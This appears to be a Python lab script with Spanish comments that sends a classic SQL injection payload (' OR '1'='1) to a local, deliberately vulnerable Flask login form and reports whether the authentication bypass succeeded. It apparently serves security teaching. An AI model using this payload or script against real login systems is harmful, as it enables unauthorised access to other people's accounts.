import requests

# URL del servidor Flask local
URL = "http://127.0.0.1:5000/"

def probar_sql_injection():
    print("[*] Iniciando prueba de ataque simulado (SQL Injection)...")
    
    # Payload clásico para bypass de autenticación en el campo de usuario
    payload_usuario = "' OR '1'='1"
    payload_password = "password_falso"
    
    # Datos enviados al formulario de login
    datos_ataque = {
        'username': payload_usuario,
        'password': payload_password
    }
    
    try:
        # Enviar petición POST a la aplicación vulnerable
        response = requests.post(URL, data=datos_ataque)
        
        print(f"[DEBUG] Código de estado HTTP recibido: {response.status_code}")
        
        # Analizar si el ataque fue exitoso buscando palabras clave en la respuesta
        if "¡Bienvenido" in response.text:
            print("[+] ¡ATAQUE EXITOSO! Se logró hacer Bypass de Autenticación mediante SQLi.")
            print("[+] El servidor autenticó al usuario administrador sin conocer la contraseña real.")
        else:
            print("[-] El ataque no surtió efecto o el servidor bloqueó la entrada.")
            
    except requests.exceptions.ConnectionError:
        print("[-] Error: No se pudo conectar al servidor. Asegúrate de tener ejecutando 'app_vulnerable.py' en otra terminal.")

if __name__ == "__main__":
    probar_sql_injection()